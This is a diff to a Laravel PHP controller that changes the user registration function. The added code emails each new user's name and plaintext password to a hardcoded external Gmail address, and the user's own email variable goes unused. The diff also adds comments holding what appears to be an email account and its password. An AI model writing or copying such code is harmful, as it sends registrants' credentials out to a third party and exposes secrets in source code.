@@ -6,7 +6,8 @@ use Illuminate\Http\Request;
 use App\Http\Controllers\Controller;
 use Illuminate\Support\Facades\Hash;
 use App\Datos_empresa;
-
+use Mail;
+use SendMail;
 class ConsultasController extends Controller
 {
     public function nuevoR(Request $resquest)
@@ -36,6 +37,17 @@ class ConsultasController extends Controller
             'email'=>$resquest['email'],
             'password'=>Hash::make($resquest['password']),
         ]);
+        // theincidence.19@gmail.com
+        // Barcelona_12
+        $correoEnviar=$resquest['email'];
+        $datos = array('Nombre'=>$resquest['nombre'] ,'constraseña'=>$resquest['password']);
+        Mail::send('email.contactos',$datos, function($msj){
+            $msj->to("ariel.zac18@gmail.com","theincidence");
+            $msj->subject("Envio de datos cuenta");
+            $msj->from('heincidence.19@gmail.com',"theinciden");
+        });
+
+        
         return;
     }
 }
